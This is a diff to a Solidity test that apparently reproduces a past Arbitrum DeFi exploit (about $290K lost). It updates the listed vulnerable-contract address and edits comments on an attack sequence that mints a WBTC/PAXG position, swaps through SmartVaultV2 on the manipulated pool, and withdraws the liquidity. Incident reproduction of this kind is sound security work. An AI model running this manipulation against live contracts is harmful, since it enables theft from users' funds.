@@ -7,7 +7,7 @@ import "./interface.sol";
 // @KeyInfo - Total Lost : ~$290K
 // Attacker : https://arbiscan.io/address/0x09ed480feaf4cbc363481717e04e2c394ab326b4
 // Attack Contract : https://arbiscan.io/address/0xb589d4a36ef8766d44c9785131413a049d51dbc0
-// Vuln Contract : https://arbiscan.io/address/0xac70bd92f89e6739b3a08db9b6081a923912f73d
+// Vuln Contract : https://arbiscan.io/address/0x29046f8f9e7623a6a21cc8c3cc2a2121ae855b8d
 // Attack Tx : https://explorer.phalcon.xyz/tx/arbitrum/0x51293c1155a1d33d8fc9389721362044c3a67e0ac732b3a6ec7661d47b03df9f
 
 // @Analysis
@@ -131,7 +131,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        // Attacker sends PAXG amount to exploit contract before attack
+        // Attacker sent PAXG amount to exploit contract before attack
         deal(address(PAXG), address(this), 100e9);
 
         emit log_named_decimal_uint(
@@ -182,6 +182,8 @@ contract ContractTest is Test {
         WBTC.approve(address(PositionsNFT), 10);
         PAXG.approve(address(PositionsNFT), 100e9);
         (uint256 tokenId, uint128 liquidity) = mintWBTC_PAXG();
+
+        // Swap in the pool (WBTC/PAXG), which was manipulated through the sole position the attacker had opened before.
         SmartVaultV2.swap(bytes32(hex"57425443"), bytes32(hex"50415847"), 1e9);
         decreaseLiquidityInPool(tokenId, liquidity);
         collectWBTC_PAXG(tokenId);
